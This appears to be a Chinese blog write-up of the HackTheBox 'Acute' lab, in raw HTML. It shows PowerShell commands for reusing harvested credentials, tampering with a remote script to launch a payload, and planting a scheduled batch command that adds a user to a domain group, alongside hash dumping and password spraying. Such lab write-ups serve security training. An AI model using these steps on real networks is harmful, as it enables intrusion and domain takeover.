<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>0X007 Acute | 养猪日记</title>
<meta name=keywords content><meta name=description content="端口扫描






获取立足点
端口扫描没发现东西：


打开网站看一下：


修改hosts:


然后这里是我看到了，但是不知道怎么利用的：
这里的用户名是看到了：


同时，这个word也看到了：


但是没看文件属性：


然后是文件内容，英语挺重要：
原始密码是：Password1!


然后这里其实涉及了一个知识盲区，PSWA是什么东西：




然后上面说到的会议连接在这里：


打开页面：
https://atsserver.acute.local/Acute_Staff_Access


然后这里Computer name应该是Acute-PC01，是word里面的作者，密码是Password1!，账户是网页上的，但是经过尝试，均为失败：
然后问了一下GPT：


也就是说可能是这种变形：


账户名是：EDavies


反弹shell:
这里看是下载成功了，但是好像有杀软，被杀了：


然后是我没想到的，我认为应该是进行免杀，但是作者是给了免杀目录的，我不太明白这是否具备普适性，所以我问了一下GPT：


所以还是英语不太好，吃大亏了：


使用Get-ChildItem -Force可以查看隐藏文件


权限提升
好吧，这里还是没办法，参考官方文档，只能使用msf了："><meta name=author content="养猪日记"><link rel=canonical href=https://yangzhuzai.github.io/posts/htb/0x007-acute/><link crossorigin=anonymous href=/assets/css/stylesheet.54405a410796490bc874ab6181fac9b675753cc2b91375d8f882566459eca428.css integrity="sha256-VEBaQQeWSQvIdKthgfrJtnV1PMK5E3XY+IJWZFnspCg=" rel="preload stylesheet" as=style><link rel=icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://yangzhuzai.github.io/posts/htb/0x007-acute/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="0X007 Acute"><meta property="og:description" content="端口扫描






获取立足点
端口扫描没发现东西：


打开网站看一下：


修改hosts:


然后这里是我看到了，但是不知道怎么利用的：
这里的用户名是看到了：


同时，这个word也看到了：


但是没看文件属性：


然后是文件内容，英语挺重要：
原始密码是：Password1!


然后这里其实涉及了一个知识盲区，PSWA是什么东西：




然后上面说到的会议连接在这里：


打开页面：
https://atsserver.acute.local/Acute_Staff_Access


然后这里Computer name应该是Acute-PC01，是word里面的作者，密码是Password1!，账户是网页上的，但是经过尝试，均为失败：
然后问了一下GPT：


也就是说可能是这种变形：


账户名是：EDavies


反弹shell:
这里看是下载成功了，但是好像有杀软，被杀了：


然后是我没想到的，我认为应该是进行免杀，但是作者是给了免杀目录的，我不太明白这是否具备普适性，所以我问了一下GPT：


所以还是英语不太好，吃大亏了：


使用Get-ChildItem -Force可以查看隐藏文件


权限提升
好吧，这里还是没办法，参考官方文档，只能使用msf了："><meta property="og:type" content="article"><meta property="og:url" content="https://yangzhuzai.github.io/posts/htb/0x007-acute/"><meta property="og:image" content="https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-10-11T14:25:59+08:00"><meta property="article:modified_time" content="2024-10-11T14:25:59+08:00"><meta property="og:site_name" content="养猪日记"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="0X007 Acute"><meta name=twitter:description content="端口扫描






获取立足点
端口扫描没发现东西：


打开网站看一下：


修改hosts:


然后这里是我看到了，但是不知道怎么利用的：
这里的用户名是看到了：


同时，这个word也看到了：


但是没看文件属性：


然后是文件内容，英语挺重要：
原始密码是：Password1!


然后这里其实涉及了一个知识盲区，PSWA是什么东西：




然后上面说到的会议连接在这里：


打开页面：
https://atsserver.acute.local/Acute_Staff_Access


然后这里Computer name应该是Acute-PC01，是word里面的作者，密码是Password1!，账户是网页上的，但是经过尝试，均为失败：
然后问了一下GPT：


也就是说可能是这种变形：


账户名是：EDavies


反弹shell:
这里看是下载成功了，但是好像有杀软，被杀了：


然后是我没想到的，我认为应该是进行免杀，但是作者是给了免杀目录的，我不太明白这是否具备普适性，所以我问了一下GPT：


所以还是英语不太好，吃大亏了：


使用Get-ChildItem -Force可以查看隐藏文件


权限提升
好吧，这里还是没办法，参考官方文档，只能使用msf了："><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://yangzhuzai.github.io/posts/"},{"@type":"ListItem","position":2,"name":"0X007 Acute","item":"https://yangzhuzai.github.io/posts/htb/0x007-acute/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"0X007 Acute","name":"0X007 Acute","description":"端口扫描 获取立足点 端口扫描没发现东西：\n打开网站看一下：\n修改hosts:\n然后这里是我看到了，但是不知道怎么利用的：\n这里的用户名是看到了：\n同时，这个word也看到了：\n但是没看文件属性：\n然后是文件内容，英语挺重要：\n原始密码是：Password1!\n然后这里其实涉及了一个知识盲区，PSWA是什么东西：\n然后上面说到的会议连接在这里：\n打开页面：\nhttps://atsserver.acute.local/Acute_Staff_Access\n然后这里Computer name应该是Acute-PC01，是word里面的作者，密码是Password1!，账户是网页上的，但是经过尝试，均为失败：\n然后问了一下GPT：\n也就是说可能是这种变形：\n账户名是：EDavies\n反弹shell:\n这里看是下载成功了，但是好像有杀软，被杀了：\n然后是我没想到的，我认为应该是进行免杀，但是作者是给了免杀目录的，我不太明白这是否具备普适性，所以我问了一下GPT：\n所以还是英语不太好，吃大亏了：\n使用Get-ChildItem -Force可以查看隐藏文件\n权限提升 好吧，这里还是没办法，参考官方文档，只能使用msf了：\n","keywords":[],"articleBody":"端口扫描 获取立足点 端口扫描没发现东西：\n打开网站看一下：\n修改hosts:\n然后这里是我看到了，但是不知道怎么利用的：\n这里的用户名是看到了：\n同时，这个word也看到了：\n但是没看文件属性：\n然后是文件内容，英语挺重要：\n原始密码是：Password1!\n然后这里其实涉及了一个知识盲区，PSWA是什么东西：\n然后上面说到的会议连接在这里：\n打开页面：\nhttps://atsserver.acute.local/Acute_Staff_Access\n然后这里Computer name应该是Acute-PC01，是word里面的作者，密码是Password1!，账户是网页上的，但是经过尝试，均为失败：\n然后问了一下GPT：\n也就是说可能是这种变形：\n账户名是：EDavies\n反弹shell:\n这里看是下载成功了，但是好像有杀软，被杀了：\n然后是我没想到的，我认为应该是进行免杀，但是作者是给了免杀目录的，我不太明白这是否具备普适性，所以我问了一下GPT：\n所以还是英语不太好，吃大亏了：\n使用Get-ChildItem -Force可以查看隐藏文件\n权限提升 好吧，这里还是没办法，参考官方文档，只能使用msf了：\n把进程迁移到了explorer:\n通过qwinsta /server:127.0.0.1命令，可以看到edavies用户，也就是当前用户，使用了远程：\n使用\n那么这里可以看到几个信息，主机名：atsserver，密码：w3_4R3_th3_f0rce，用户名：acute\\imonks:\n使用账号密码申请凭据，执行命令：\n$passwd = ConvertTo-SecureString \"W3_4R3_th3_f0rce.\" -AsPlainText -force\r$cred = New-Object System.Management.Automation.PSCredential (\"acute\\imonks\", $passwd)\rInvoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock {whoami} -credential $cred 此时应该是在另外一台主机了，重新侦察信息：\n拿到第一个flag和第二个凭据：\n$securepasswd = ‘01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51’\n$passwd = $securepasswd | ConvertTo-SecureString\n$creds = New-Object System.Management.Automation.PSCredential (“acute\\jmorgan”, $passwd)\nInvoke-Command -ScriptBlock {Get-Volume} -ComputerName Acute-PC01 -Credential $creds\n这个用户叫做jmorgan，主机名是 Acute-PC01，也就是我们当前的这台主机，看看这个用户的权限：\n可以发现是这台机器的管理员用户，也就是说我们可以尝试获取到本台主机的管理员权限，\n这时候想到的就是，反弹一个shell回来：\n修改原来的代码为：\nInvoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock {((Get-Content \"c:\\users\\imonks\\Desktop\\wm.ps1\" -Raw) -replace 'Get-Volume','cmd.exe /c c:\\utils\\cxk2.exe') | set-content -path c:\\users\\imonks\\Desktop\\wm.ps1} -credential $cred 查看修改效果：\n执行一下这个代码：\nInvoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock {c:\\users\\imonks\\Desktop\\wm.ps1} -credential $cred 当前用户：\n当前IP：\nhashdump:\nadministrator 是Password@123，两个为空：\n这个密码，是这台机器的，别忘了还有一台叫做ATSSERVER的机器：\n这台机器有以下账户：\n尝试使用Password@123进行登录：\n使用awallace登录成功：\n然后在C:\\Program Files目录中，找到一个目录，叫做keepmeon，这个目录使用imonks用户是进不去的，只能使用awallace用户登录：\n查看：\n这个就比较简单了，计划任务提权：\n但是这里说了，只有lois使用，这个lois是什么权限，我们就能提升到什么权限：\n路易斯是网站管理员，看看site_admin\n根据描述，这个组可以访问domain group:\n本来想重新弹个shell回来，但是琢磨着，可能有杀软，就还是改一下管理组吧：\nInvoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock {Set-Content -Path 'c:\\program files\\Keepmeon\\admin.bat' -Value 'net group site_admin awallace /add /domain'} 再次查看就可以看到awallace在组内了：\n然后就可以进去administrator目录了：\n查看：\n总结 这个实验室巨难，是一个域内的靶场，两台主机，来回反复获取凭证。\n梳理一下流程：\n入口IP：10.10.11.145 端口扫描： 发现443 https端口，浏览器访问失效，通过证书发现域名，修改hosts文件，成功访问到了网页。\nweb渗透： 首页about us，泄露部分出名员工名称，同时有个新人表单，通过新人表单，可以发现PSWA入口以及默认密码：Password1!，以及创建者主机信息：Acute-PC01以及\n后渗透阶段： 这台靶机目前最好还是使用\n后渗透-横向移动阶段1： 通过查看当前的远程登录会话，可以发现目前的用户acute\\edavies是使用了RDP的，使用meterpreter的屏幕监控功能，查看当前用户的操作，发现了另外一台主机名为：ATSSERVER，以及一个相关凭证：密码：W3_4R3_th3_f0rce.用户：acute\\imonks，使用powershell，申请凭证，获取到ATSSERVER普通权限，可以拿到第一个user.txt，同时使用这个用户可以发现Program Files目录下有个keepmeon目录，是用户安装的，非常规软件目录，但是当前\\imonks用户没有权限进入。\n后渗透-横向移动阶段2： 在第一个user.txt的附近有主机Acute-PC01的脚本信息，虽然密码进行了加密，但是可以修改脚本达到命令执行的效果，反弹一个脚本内用户的权限为：acute\\jmorgan，属于本地管理员用户组，也就是说我们拿到了Acute-PC01主机的管理员权限。\n后渗透-横向移动阶段3： 使用Acute-PC01主机的管理员权限dumphash，拿到本地administrator的密码，但是无法登录ATSSERVER，由于我们之前拥有ATSSERVER的imonks用户，通过查看用户目录，可以知道该主机有哪些用户登录过了，使用Acute-PC01主机的密码进行喷洒，成功获取了一个名为awallace的用户。\n后渗透-横向移动阶段4： awallace用户可以进去keepmeon目录，这个目录下面有个bat文件，内容为计划任务，执行者为\n","wordCount":"174","inLanguage":"en","image":"https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2024-10-11T14:25:59+08:00","dateModified":"2024-10-11T14:25:59+08:00","author":{"@type":"Person","name":"养猪日记"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://yangzhuzai.github.io/posts/htb/0x007-acute/"},"publisher":{"@type":"Organization","name":"养猪日记","logo":{"@type":"ImageObject","url":"https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://yangzhuzai.github.io/ accesskey=h title="Home (Alt + H)"><img src=https://yangzhuzai.github.io/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://yangzhuzai.github.io/categories/ title=分类><span>分类</span></a></li><li><a href=https://yangzhuzai.github.io/search/ title=搜索><span>搜索</span></a></li><li><a href=https://github.com/yangzhuzai title=Github><span>Github</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://yangzhuzai.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://yangzhuzai.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">0X007 Acute</h1><div class=post-meta><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;174 words&nbsp;·&nbsp;养猪日记</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><ul><li></li></ul></li></ul></nav></div></details></div><div class=post-content><h1 id=端口扫描>端口扫描<a hidden class=anchor aria-hidden=true href=#端口扫描>#</a></h1><p><img loading=lazy src=/htb_img/WEBRESOURCE7bced707209a355e5b0d8e37665b10c6image.png alt></p><p><img loading=lazy src=/htb_img/WEBRESOURCE1553e03a5a52725213cc98b0d93dad66image.png alt></p><p><img loading=lazy src=/htb_img/WEBRESOURCEe9bc11587966185546c54c64b1c03fdcimage.png alt></p><h1 id=获取立足点>获取立足点<a hidden class=anchor aria-hidden=true href=#获取立足点>#</a></h1><p>端口扫描没发现东西：</p><p><img loading=lazy src=/htb_img/WEBRESOURCEc3827f6e5c0c0ed9fe650ad4b0d794b8image.png alt></p><p>打开网站看一下：</p><p><img loading=lazy src=/htb_img/WEBRESOURCEfe70211233839785d604541ed4534e40image.png alt></p><p>修改hosts:</p><p><img loading=lazy src=/htb_img/WEBRESOURCEd18aed551b61f788a2d4b032bd126d42image.png alt></p><p>然后这里是我看到了，但是不知道怎么利用的：</p><p>这里的用户名是看到了：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE7d4afbef001b7925f4b2b74890cd4006image.png alt></p><p>同时，这个word也看到了：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE738cf0d3e074876b486600fd30f2d176image.png alt></p><p>但是没看文件属性：</p><p><img loading=lazy src=/htb_img/WEBRESOURCEba21a112c62051f8191d46bcefd555faimage.png alt></p><p>然后是文件内容，英语挺重要：</p><p>原始密码是：Password1!</p><p><img loading=lazy src=/htb_img/WEBRESOURCE93e40bc3cae9ca0fe0f345104db0c13fimage.png alt></p><p>然后这里其实涉及了一个知识盲区，PSWA是什么东西：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE7787611761e770eccc9a1a9242b89118image.png alt></p><p><img loading=lazy src=/htb_img/WEBRESOURCEdfad486d271f9e44031a5f10ab92d612image.png alt></p><p>然后上面说到的会议连接在这里：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE4d920afa8c0b68c03132d544e4a4fb7aimage.png alt></p><p>打开页面：</p><p><a href=https://atsserver.acute.local/Acute_Staff_Access>https://atsserver.acute.local/Acute_Staff_Access</a></p><p><img loading=lazy src=/htb_img/WEBRESOURCE70c4428b1e1da9e3183cf2eb22a8ab8eimage.png alt></p><p>然后这里Computer name应该是Acute-PC01，是word里面的作者，密码是Password1!，账户是网页上的，但是经过尝试，均为失败：</p><p>然后问了一下GPT：</p><p><img loading=lazy src=/htb_img/WEBRESOURCEd5435cb71dc3ff2e46c3830c9455a079image.png alt></p><p>也就是说可能是这种变形：</p><p><img loading=lazy src=/htb_img/WEBRESOURCEc12c78fb2716be13fa889352ed571759image.png alt></p><p>账户名是：EDavies</p><p><img loading=lazy src=/htb_img/WEBRESOURCE21116ef509fd1d912543fb44a5a5de8eimage.png alt></p><p>反弹shell:</p><p>这里看是下载成功了，但是好像有杀软，被杀了：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE711ea82608ebd740c11c84dc2ed4bf7bimage.png alt></p><p>然后是我没想到的，我认为应该是进行免杀，但是作者是给了免杀目录的，我不太明白这是否具备普适性，所以我问了一下GPT：</p><p><img loading=lazy src=/htb_img/WEBRESOURCEa107fca6b135c6706f24712112b290bcimage.png alt></p><p>所以还是英语不太好，吃大亏了：</p><p><img loading=lazy src=/htb_img/WEBRESOURCEbf62ff533327d3c3bdb581f11c9b0800image.png alt></p><p>使用Get-ChildItem -Force可以查看隐藏文件</p><p><img loading=lazy src=/htb_img/WEBRESOURCE56fea9b0b68d0d25947440b0deff30f2image.png alt></p><h1 id=权限提升>权限提升<a hidden class=anchor aria-hidden=true href=#权限提升>#</a></h1><p>好吧，这里还是没办法，参考官方文档，只能使用msf了：</p><p>把进程迁移到了explorer:</p><p><img loading=lazy src=/htb_img/WEBRESOURCE1d04ece71a53cad75c59c2dcc83cabe1image.png alt></p><p>通过qwinsta /server:127.0.0.1命令，可以看到edavies用户，也就是当前用户，使用了远程：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE3d3e3c87d12ed77d64a16b1c9c5030d5image.png alt></p><p>使用</p><p><img loading=lazy src=/htb_img/WEBRESOURCEc10c91c33c3e7f57c708e4b62c9b3906image.png alt></p><p><img loading=lazy src=/htb_img/WEBRESOURCEa4bbe2512f05f52f825ad5a9598db108image.png alt></p><p>那么这里可以看到几个信息，主机名：atsserver，密码：w3_4R3_th3_f0rce，用户名：acute\imonks:</p><p>使用账号密码申请凭据，执行命令：</p><pre tabindex=0><code>$passwd = ConvertTo-SecureString &#34;W3_4R3_th3_f0rce.&#34; -AsPlainText -force
$cred = New-Object System.Management.Automation.PSCredential (&#34;acute\imonks&#34;, $passwd)
Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock {whoami} -credential $cred
</code></pre><p><img loading=lazy src=/htb_img/WEBRESOURCE8c57785662c70b06d2d10f64141a5e52image.png alt></p><p>此时应该是在另外一台主机了，重新侦察信息：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE822a1b5bf9dd011a887773c39683a30bimage.png alt></p><p>拿到第一个flag和第二个凭据：</p><p>$securepasswd = &lsquo;01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51&rsquo;</p><p>$passwd = $securepasswd | ConvertTo-SecureString</p><p>$creds = New-Object System.Management.Automation.PSCredential (&ldquo;acute\jmorgan&rdquo;, $passwd)</p><p>Invoke-Command -ScriptBlock {Get-Volume} -ComputerName Acute-PC01 -Credential $creds</p><p>这个用户叫做jmorgan，主机名是 Acute-PC01，也就是我们当前的这台主机，看看这个用户的权限：</p><p>可以发现是这台机器的管理员用户，也就是说我们可以尝试获取到本台主机的管理员权限，</p><p><img loading=lazy src=/htb_img/WEBRESOURCE9b6c292f2dd5358bc643c4dcf55dc8bcimage.png alt></p><p>这时候想到的就是，反弹一个shell回来：</p><p>修改原来的代码为：</p><pre tabindex=0><code>Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock {((Get-Content &#34;c:\users\imonks\Desktop\wm.ps1&#34; -Raw) -replace &#39;Get-Volume&#39;,&#39;cmd.exe /c c:\utils\cxk2.exe&#39;) | set-content -path c:\users\imonks\Desktop\wm.ps1} -credential $cred
</code></pre><p>查看修改效果：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE6354719b4de59b68b78287412390064fimage.png alt></p><p>执行一下这个代码：</p><pre tabindex=0><code>Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock {c:\users\imonks\Desktop\wm.ps1} -credential $cred
</code></pre><p><img loading=lazy src=/htb_img/WEBRESOURCEd927742bc58e03aecc5cfeca070ccd62image.png alt></p><p>当前用户：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE3670a85091910f29d239876eb7f0857bimage.png alt></p><p>当前IP：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE626e5ebbe93d1b678ae73f205a687427image.png alt></p><p>hashdump:</p><p><img loading=lazy src=/htb_img/WEBRESOURCE9d6bc54f9003da4b6df1ef2e40bf4f06image.png alt></p><p>administrator 是Password@123，两个为空：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE076bf7651b32e43e6c18dd3e213e63c4image.png alt></p><p>这个密码，是这台机器的，别忘了还有一台叫做ATSSERVER的机器：</p><p>这台机器有以下账户：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE2d8fe2fd10640446cc226d657d6c37f9image.png alt></p><p>尝试使用Password@123进行登录：</p><p>使用awallace登录成功：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE8d115bedfa3667d93c6e6d1daee12cc4image.png alt></p><p>然后在C:\Program Files目录中，找到一个目录，叫做keepmeon，这个目录使用imonks用户是进不去的，只能使用awallace用户登录：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE02571ae062e38d364f5032e54fa7a190image.png alt></p><p><img loading=lazy src=/htb_img/WEBRESOURCE8a55cb33c5bbbfcba8ad4ce9bf2167adimage.png alt></p><p>查看：</p><p><img loading=lazy src=/htb_img/WEBRESOURCEab98a8da667f79bd0b25134d9091fa8aimage.png alt></p><p>这个就比较简单了，计划任务提权：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE33560b9cde096a1eaef15961ca6c1ad1image.png alt></p><p>但是这里说了，只有lois使用，这个lois是什么权限，我们就能提升到什么权限：</p><p><img loading=lazy src=/htb_img/WEBRESOURCEb8c5fcf39ec4d8c50651e97f701ffd89image.png alt></p><p>路易斯是网站管理员，看看site_admin</p><p><img loading=lazy src=/htb_img/WEBRESOURCEd8bb8af4a1866afd9caa06d80a23de6fimage.png alt></p><p>根据描述，这个组可以访问domain group:</p><p><img loading=lazy src=/htb_img/WEBRESOURCEac0406db4f1aac83a408aaed0cb5e9a6image.png alt></p><p>本来想重新弹个shell回来，但是琢磨着，可能有杀软，就还是改一下管理组吧：</p><pre tabindex=0><code>Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock {Set-Content -Path &#39;c:\program files\Keepmeon\admin.bat&#39; -Value &#39;net group site_admin awallace /add /domain&#39;}
</code></pre><p><img loading=lazy src=/htb_img/WEBRESOURCEd625692abf29b668da34941be5ba93b4image.png alt></p><p><img loading=lazy src=/htb_img/WEBRESOURCEfc1fcb1dfff440911f4f2071b34871ddimage.png alt></p><p>再次查看就可以看到awallace在组内了：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE5399b3b4ef7c14a3a2ce614b2f4b674eimage.png alt></p><p>然后就可以进去administrator目录了：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE1cbbf1da4aecc19b82a9638130647c14image.png alt></p><p>查看：</p><p><img loading=lazy src=/htb_img/WEBRESOURCEff16b188cdfc6eb080522f372c11532dimage.png alt></p><h1 id=总结>总结<a hidden class=anchor aria-hidden=true href=#总结>#</a></h1><p>这个实验室巨难，是一个域内的靶场，两台主机，来回反复获取凭证。</p><p>梳理一下流程：</p><h4 id=入口ip101011145>入口IP：10.10.11.145<a hidden class=anchor aria-hidden=true href=#入口ip101011145>#</a></h4><h4 id=端口扫描-1>端口扫描：<a hidden class=anchor aria-hidden=true href=#端口扫描-1>#</a></h4><p>发现443 https端口，浏览器访问失效，通过证书发现域名，修改hosts文件，成功访问到了网页。</p><h4 id=web渗透>web渗透：<a hidden class=anchor aria-hidden=true href=#web渗透>#</a></h4><p>首页about us，泄露部分出名员工名称，同时有个新人表单，通过新人表单，可以发现PSWA入口以及默认密码：Password1!，以及创建者主机信息：Acute-PC01以及</p><h4 id=后渗透阶段>后渗透阶段：<a hidden class=anchor aria-hidden=true href=#后渗透阶段>#</a></h4><p>这台靶机目前最好还是使用</p><h4 id=后渗透-横向移动阶段1>后渗透-横向移动阶段1：<a hidden class=anchor aria-hidden=true href=#后渗透-横向移动阶段1>#</a></h4><p>通过查看当前的远程登录会话，可以发现目前的用户acute\edavies是使用了RDP的，使用meterpreter的屏幕监控功能，查看当前用户的操作，发现了另外一台主机名为：ATSSERVER，以及一个相关凭证：密码：W3_4R3_th3_f0rce.用户：acute\imonks，使用powershell，申请凭证，获取到ATSSERVER普通权限，可以拿到第一个user.txt，同时使用这个用户可以发现Program Files目录下有个keepmeon目录，是用户安装的，非常规软件目录，但是当前\imonks用户没有权限进入。</p><h4 id=后渗透-横向移动阶段2><strong>后渗透-横向移动阶段2：</strong><a hidden class=anchor aria-hidden=true href=#后渗透-横向移动阶段2>#</a></h4><p>在第一个user.txt的附近有主机Acute-PC01的脚本信息，虽然密码进行了加密，但是可以修改脚本达到命令执行的效果，反弹一个脚本内用户的权限为：acute\jmorgan，属于本地管理员用户组，也就是说我们拿到了Acute-PC01主机的管理员权限。</p><h4 id=后渗透-横向移动阶段3><strong>后渗透-横向移动阶段3：</strong><a hidden class=anchor aria-hidden=true href=#后渗透-横向移动阶段3>#</a></h4><p>使用Acute-PC01主机的管理员权限dumphash，拿到本地administrator的密码，但是无法登录ATSSERVER，由于我们之前拥有ATSSERVER的imonks用户，通过查看用户目录，可以知道该主机有哪些用户登录过了，使用Acute-PC01主机的密码进行喷洒，成功获取了一个名为awallace的用户。</p><h4 id=后渗透-横向移动阶段4><strong>后渗透-横向移动阶段4：</strong><a hidden class=anchor aria-hidden=true href=#后渗透-横向移动阶段4>#</a></h4><p>awallace用户可以进去keepmeon目录，这个目录下面有个bat文件，内容为计划任务，执行者为</p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://yangzhuzai.github.io/posts/vulnhub/0x006-misdirection1/><span class=title>« Prev</span><br><span>0x006 Misdirection1</span>
</a><a class=next href=https://yangzhuzai.github.io/posts/vulnhub/0x007-sar1/><span class=title>Next »</span><br><span>0x007 Sar1</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://yangzhuzai.github.io/>养猪日记</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var 